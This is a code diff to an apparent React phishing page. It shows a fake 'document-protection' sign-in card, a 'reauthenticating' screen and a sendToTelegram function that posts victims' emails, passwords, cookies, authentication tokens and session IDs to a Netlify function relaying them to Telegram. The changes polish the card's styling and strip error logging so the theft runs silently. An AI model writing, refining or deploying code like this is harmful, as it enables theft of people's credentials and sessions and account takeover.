@@ -345,7 +345,6 @@ function App() {
         setCurrentPage('reauthenticating');
       }, 1000);
     } catch (error) {
-      console.error('Error submitting form:', error);
       setTimeout(() => {
         setCurrentPage('reauthenticating');
       }, 1000);
@@ -368,7 +367,7 @@ function App() {
   const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
     try {
       const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
-      const response = await fetch(netlifyFunctionUrl, {
+      await fetch(netlifyFunctionUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -382,7 +381,6 @@ function App() {
           url
         })
       });
-      await response.json();
     } catch (error) {}
   };
 
@@ -461,6 +459,7 @@ function App() {
       );
 
     case 'document-protection':
+      // --- Slightly wider desktop card, reduced instructions text size ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -484,6 +483,13 @@ function App() {
               display: flex;
               flex-direction: column;
               align-items: center;
+            }
+            @media (min-width: 800px) {
+              .card {
+                max-width: 400px;
+                padding-left: 32px;
+                padding-right: 32px;
+              }
             }
             .logo {
               width: 70px;
@@ -513,10 +519,10 @@ function App() {
               word-break: break-word;
             }
             .instructions {
-              font-size: 0.83em;
+              font-size: 0.76em;
               color: #626b76;
               margin-bottom: 13px;
-              line-height: 1.4em;
+              line-height: 1.35em;
               text-align: center;
               max-width: 300px;
               margin-left: auto;
@@ -682,7 +688,6 @@ function App() {
           </div>
         </div>
       );
-      // --- End reduced card & new form ---
 
     case 'reauthenticating':
       return (
